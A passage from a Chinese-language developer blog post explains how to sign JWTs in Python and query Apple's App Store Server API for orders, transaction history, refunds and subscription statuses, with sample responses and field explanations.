class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;2X9R4HXF34&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;57246542-96fe-1a63-e053-0824d011072a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1623085200</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1623086400</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;appstoreconnect-v1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonce&quot;</span>: <span class="string">&quot;6edffe66-b482-11eb-8529-0242ac130003&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bid&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了以上参数和密钥文件后，我们就可以按 JWT 规范要求来生成 token 值。下面以 <code>Python3</code> 代码来生成 token，其它语言类型。</p><p>首先，终端执行命令，安装 ptyhon 依赖库：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> PyJWT</span><br></pre></td></tr></table></figure><p>我们利用 Python 的 <code>PyJWT</code> 库来生成 JWT token。示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取密钥文件证书内容</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/Users/37/Downloads/SubscriptionKey_2X9R4HXF34.p8&quot;</span>)</span><br><span class="line">key_data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT Header</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span class="line"><span class="string">&quot;kid&quot;</span>: <span class="string">&quot;2X9R4HXF34&quot;</span>,</span><br><span class="line"><span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT Payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line"><span class="string">&quot;iss&quot;</span>: <span class="string">&quot;57246542-96fe-1a63-e053-0824d011072a&quot;</span>,</span><br><span class="line"><span class="string">&quot;aud&quot;</span>: <span class="string">&quot;appstoreconnect-v1&quot;</span>,</span><br><span class="line"><span class="string">&quot;iat&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">60</span>, <span class="comment"># 60 minutes timestamp</span></span><br><span class="line"><span class="string">&quot;nonce&quot;</span>: <span class="string">&quot;6edffe66-b482-11eb-8529-0242ac130003&quot;</span>,</span><br><span class="line"><span class="string">&quot;bid&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT token</span></span><br><span class="line">token = jwt.encode(headers=header, payload=payload, key=key_data, algorithm=<span class="string">&quot;ES256&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;JWT Token:&quot;</span>, token)</span><br></pre></td></tr></table></figure><p>输出示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjJYOVI0SFhGMzQifQ.eyJpc3MiOiI1NzI0NjU0Mi05NmZlLTFhNjMtZTA1My0wODI0ZDAxMTA3MmEiLCJhdWQiOiJhcHBzdG9yZWNvbm5lY3QtdjEiLCJpYXQiOjE2NDMwMTU1OTQsImV4cCI6MTY0MzAxOTE5NCwibm9uY2UiOiI2ZWRmZmU2Ni1iNDgyLTExZWItODUyOS0wMjQyYWMxMzAwMDMiLCJiaWQiOiJjb20uYXBwbGUudGVzdCJ9.muBKcbT3AnK3WAivbtIr64d2Gu7bVhGL3AhiYnDjb7D3qslHNnASE2EUUuN24jOLsSnLBWkBdwDutl5UU87paw</span><br></pre></td></tr></table></figure><p>通过这个脚本就可以生成 token 来请求 App Store Server API 了。当然可以把以上代码封装成一个方法，传入 kid 和 iss 等参数，然后返回 token，这里就略过了。</p><h3 id="2-3-接口讲解"><a href="#2-3-接口讲解" class="headerlink" title="2.3 接口讲解"></a>2.3 接口讲解</h3><p>说了这么多，终于回到下文啦！！！</p><p>怎么请求 App Store Server API ？苹果给出了一个示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v -H <span class="string">&#x27;Authorization: Bearer [signed token]&#x27;</span> </span><br><span class="line"><span class="string">&quot;https://api.storekit.itunes.apple.com/inApps/v1/subscriptions/&#123;original_transaction_id&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>也就是用 JWT 生成的 token，放到 App Store Server API 请求链接的 header 部分，key 为 <code>Authorization</code>，value为 <code>Bearer [signed token]</code>。</p><p>接下来，我们通过 Python 的 <code>requests</code> 来请求 App Store Server API。大家也可以用其它的工具来模拟，比如在线工具或者 Postman 等。</p><p>终端执行命令，安装 ptyhon 依赖库：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> requests</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT Token</span></span><br><span class="line">token = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求链接和参数</span></span><br><span class="line">url = <span class="string">&quot;https://api.storekit.itunes.apple.com/inApps/v1/lookup/&quot;</span> + <span class="string">&quot;MK5TTTVWJH&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 请求和响应</span></span><br><span class="line">rs = requests.get(url, headers=header)</span><br><span class="line">data = json.loads(rs.text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>查询结果示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: <span class="number">0</span>, </span><br><span class="line">    <span class="string">&#x27;signedTransactions&#x27;</span>: [</span><br><span class="line">            <span class="string">&#x27;eyJhbGciOiJFUz.............&#x27;</span>,                       </span><br><span class="line">            <span class="string">&#x27;eyJ0eXAiOiJKV1.............&#x27;</span>,               </span><br><span class="line">            <span class="string">&#x27;eyJ0eXAiJhbGci.............&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，下面就不重复展示请求的示例了，主要是讲解一下接口作用和返回的数据格式，注意事项等。</p><h4 id="查询用户订单的收据（Look-Up-Order-ID）"><a href="#查询用户订单的收据（Look-Up-Order-ID）" class="headerlink" title="查询用户订单的收据（Look Up Order ID）"></a>查询用户订单的收据（Look Up Order ID）</h4><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-07.jpg" alt="AppStoreServerAPI-07"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/lookup/</span>&#123;orderId&#125;</span><br></pre></td></tr></table></figure><p>目前这个 <a href="https://developer.apple.com/documentation/appstoreserverapi/look_up_order_id">Look Up Order ID</a> 接口只有线上环境的，不支持沙盒环境。因为，这个接口是用户购买项目后，收到苹果的发票时，里面有一列叫订单号 <code>Order ID</code>，以前是无法与开发者从苹果获取到的交易订单号 <code>transactionId</code> 进行映射关联，而现在，可以通过这个接口查询啦！</p><p>响应的数据格式：<br><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-08.jpg" alt="AppStoreServerAPI-08"></p><p>这个接口的作用，当用户客诉（充值不到账）时，让玩家提供订单 ID，然后通过这个接口查询订单对应的状态，如果有未消耗的收据（transactionId）时，可以为用户进行补发或者服务支持。（因为能查到 transactionId，说明玩家这个充值订单是有效！至于是否消耗，需要服务端来检查是否有未消耗的收据。）</p><p><code>status=0</code>，表示有效的订单号：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: <span class="number">0</span>, </span><br><span class="line">    <span class="string">&#x27;signedTransactions&#x27;</span>: [</span><br><span class="line">            <span class="string">&#x27;eyJhbGciOiJFUz.............&#x27;</span>,                       </span><br><span class="line">            <span class="string">&#x27;eyJ0eXAiOiJKV1.............&#x27;</span>,               </span><br><span class="line">            <span class="string">&#x27;eyJ0eXAiJhbGci.............&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家如果有留意，会看到 signedTransactions 是多个 transaction 交易收据，这是为什么呢？其实，这里一个 <code>Order ID</code> 可以会对应多个购买的项目，比如用户在 1 分钟里，同时购买了 2 个项目，那些，苹果在给用户发送发票时，会合并这2个订单为一个订单，此时就只有一个订单号 <code>Order ID</code>。</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-09.jpg" alt="AppStoreServerAPI-09"></p><p>所以，开发者需要注意，<code>Order ID</code> 对于一个购买订单来说，不是唯一的。验证用户的 <code>Order ID</code> 时，也要遍历完所有的 <code>signedTransactions</code>，找到可能未消耗的项目。</p><p>每个 JWT decode 后，示例格式：</p><p><strong>header:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;ES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x5c&quot;</span>:[</span><br><span class="line">            <span class="string">&quot;MIIEMDC....&quot;</span>,</span><br><span class="line">            <span class="string">&quot;MIIDFjC....&quot;</span>,</span><br><span class="line">            <span class="string">&quot;MIICQzC....&quot;</span></span><br><span class="line">            ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;transactionId&quot;</span>: <span class="string">&quot;20000964758895&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;20000964758895&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.60&quot;</span>,</span><br><span class="line">    <span class="string">&quot;purchaseDate&quot;</span>: <span class="number">1640409900000</span>,</span><br><span class="line">    <span class="string">&quot;originalPurchaseDate&quot;</span>: <span class="number">1640409900000</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Consumable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inAppOwnershipType&quot;</span>: <span class="string">&quot;PURCHASED&quot;</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1642995907240</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是一个消耗型品项的数据格式。</p></blockquote><p>最后，关于解析 JWT 内容，这里先不深入讲解，下文在统一讲解。</p><h4 id="查询用户历史收据（Get-Transaction-History）"><a href="#查询用户历史收据（Get-Transaction-History）" class="headerlink" title="查询用户历史收据（Get Transaction History）"></a>查询用户历史收据（Get Transaction History）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/history/</span>&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p>根据  WWDC21 视频介绍，接口可以获取用户在您的 app 的应用内购买交易历史记录。但是在实践中，发现消耗型项目没有查到，重新查看接口文档 <a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History</a>，发现有了新的更新说明：</p><p><strong>交易历史记录返回结果只支持以下情况：</strong></p><ul><li>自动续期订阅</li><li>非续订订阅</li><li>非消耗型应用内购买项目</li><li>消耗型应用内购买项目：如果交易被退款、撤销或 app 尚未完成交易处理等。</li></ul><p>响应的数据格式：</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-10.jpg" alt="AppStoreServerAPI-10"></p><p>需要注意的是，返回的结果中，没有 <code>status</code> 字段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;revision&quot;</span>: <span class="string">&quot;1642993906000_1000000954832195&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;appAppleId&quot;</span>: <span class="number">925021570</span>,</span><br><span class="line">    <span class="string">&quot;environment&quot;</span>: <span class="string">&quot;Production&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hasMore&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;signedTransactions&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;eyJhbGciOi...&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eyJhbGciOi...&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认 <code>signedTransactions</code> 返回最多 20 条，目前开发者不能控制这个条数。超过 20 条时，数据有一个字段 <code>hasMore</code> 为 ture，表示有更新的历史订单有更新，此时，开发者需要增加请求的查询字段 <code>revision</code>，对应的值是从上一次请求返回的数据里对应 <code>revision</code> 字段内容。</p><p>举例来说，请求更多数据：<code>/inApps/v1/history/foriginalTransactionId&#125;&amp;revision=8a170756-e913-42fc-8629-76051f9e1134</code>。</p><p>每个 JWT decode 后，示例格式：</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;transactionId&quot;</span>: <span class="string">&quot;1000000954804912&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;1000000954804912&quot;</span>,</span><br><span class="line">    <span class="string">&quot;webOrderLineItemId&quot;</span>: <span class="string">&quot;1000000071590544&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.month&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subscriptionGroupIdentifier&quot;</span>: <span class="string">&quot;20919269&quot;</span>,</span><br><span class="line">    <span class="string">&quot;purchaseDate&quot;</span>: <span class="number">1642990548000</span>,</span><br><span class="line">    <span class="string">&quot;originalPurchaseDate&quot;</span>: <span class="number">1642990550000</span>,</span><br><span class="line">    <span class="string">&quot;expiresDate&quot;</span>: <span class="number">1642990848000</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Auto-Renewable Subscription&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inAppOwnershipType&quot;</span>: <span class="string">&quot;PURCHASED&quot;</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1643024941850</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是一个自动续期订阅品项的数据格式。</p></blockquote><p>需要注意，针对消耗型应用内购买项目，如果交易被退款、撤销，那么会包含更多的字段内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;transactionId&quot;</span>: <span class="string">&quot;20000966985176&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;20000966985176&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.60&quot;</span>,</span><br><span class="line">    <span class="string">&quot;purchaseDate&quot;</span>: <span class="number">1640759047000</span>,</span><br><span class="line">    <span class="string">&quot;originalPurchaseDate&quot;</span>: <span class="number">1640759047000</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Consumable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inAppOwnershipType&quot;</span>: <span class="string">&quot;PURCHASED&quot;</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1643246161338</span>,</span><br><span class="line">    <span class="string">&quot;revocationReason&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;revocationDate&quot;</span>: <span class="number">1643115549000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是一个消耗型项目退款的内容格式，详细描述见下一节“内购退款”。</p></blockquote><h4 id="查询用户内购退款（Get-Refund-History）"><a href="#查询用户内购退款（Get-Refund-History）" class="headerlink" title="查询用户内购退款（Get Refund History）"></a>查询用户内购退款（Get Refund History）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/refund/</span>lookup/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p>通过用户的任一个购买的 <code>originalTransactionId</code> 可以通过 <a href="https://developer.apple.com/documentation/appstoreserverapi/get_refund_history">Get Refund History</a> 查到这个用户的所有退款记录订单。</p><p>响应的数据格式：</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-11.jpg" alt="AppStoreServerAPI-11"></p><p>响应中包含的 <code>signedTransactions</code> 与 App Store Server 通知中一个或多个 <code>REFUND</code> 通知（Notification）中可能是相同。所以，使用此 API 查询您可能错过的任何退款通知，例如在服务器停机期间。</p><p>但需要注意，<strong>仅包括 App Store 批准的退款</strong>：消耗性、非消耗型、自动续期订阅和非续期订阅。如果用户没有收到任何 App Store 批准的退款，成功时返回一个空的 signedTransactions 数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;signedTransactions&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;eyJhbGciO....&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>退款的 payload 内容格式：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;transactionId&quot;</span>: <span class="string">&quot;20000966985176&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;20000966985176&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.60&quot;</span>,</span><br><span class="line">    <span class="string">&quot;purchaseDate&quot;</span>: <span class="number">1640759047000</span>,</span><br><span class="line">    <span class="string">&quot;originalPurchaseDate&quot;</span>: <span class="number">1640759047000</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Consumable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inAppOwnershipType&quot;</span>: <span class="string">&quot;PURCHASED&quot;</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1643246161338</span>,</span><br><span class="line">    <span class="string">&quot;revocationReason&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;revocationDate&quot;</span>: <span class="number">1643115549000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了 2 个新字段：</p><ul><li><p><code>revocationDate</code>：Apple Support 为交易退款的 UNIX 时间（以毫秒为单位）。</p></li><li><p><code>revocationReason</code>：App Store 为交易退款或撤销其家庭共享的原因。</p><p>  <code>0</code>：出于其他原因，Apple Support 代表客户为交易退款；例如意外购买。<br>  <code>1</code>：由于您的 app 中存在实际或感知到的问题，Apple 支持代表客户为交易退款。</p></li></ul><blockquote><p>详细字段解析，可以参考苹果文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/jwstransactiondecodedpayload">JWSTransactionDecodedPayload</a></p></blockquote><h4 id="查询用户订阅项目状态（Get-All-Subscription-Statuses）"><a href="#查询用户订阅项目状态（Get-All-Subscription-Statuses）" class="headerlink" title="查询用户订阅项目状态（Get All Subscription Statuses）"></a>查询用户订阅项目状态（Get All Subscription Statuses）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/subscriptions/</span>&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p>订阅品项状态查询 API <a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses</a>，获取您 app 中用户所有订阅的状态。</p><p>响应的数据格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;environment&quot;</span>: <span class="string">&quot;Sandbox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;securitynote&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;subscriptionGroupIdentifier&quot;</span>: <span class="string">&quot;20919269&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lastTransactions&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;status&quot;</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;1000000954804912&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;signedTransactionInfo&quot;</span>: <span class="string">&quot;eyJhbGciOiJFUz....&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;signedRenewalInfo&quot;</span>: <span class="string">&quot;eyJhbGciOiJFUzI1Ni....&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-12.jpg" alt="AppStoreServerAPI-12"></p><p><code>lastTransactions</code> 是每个订阅项目的最后的订阅状态，<code>status</code> 类型：</p><ul><li>1：有效</li><li>2：过期</li><li>3：账号扣费重试</li><li>4：账号宽限期(这个是开发者设置，比如到期扣费失败时，可以给用户延期多长时间。)</li><li>5：已经撤销。</li></ul><p><strong>signedTransactionInfo</strong> 格式示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;transactionId&quot;</span>: <span class="string">&quot;1000000955217725&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;1000000954804912&quot;</span>,</span><br><span class="line">    <span class="string">&quot;webOrderLineItemId&quot;</span>: <span class="string">&quot;1000000071615442&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bundleId&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.month&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subscriptionGroupIdentifier&quot;</span>: <span class="string">&quot;20919269&quot;</span>,</span><br><span class="line">    <span class="string">&quot;purchaseDate&quot;</span>: <span class="number">1643023487000</span>,</span><br><span class="line">    <span class="string">&quot;originalPurchaseDate&quot;</span>: <span class="number">1642990550000</span>,</span><br><span class="line">    <span class="string">&quot;expiresDate&quot;</span>: <span class="number">1643023787000</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Auto-Renewable Subscription&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inAppOwnershipType&quot;</span>: <span class="string">&quot;PURCHASED&quot;</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1643028928116</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>signedRenewalInfo</strong> 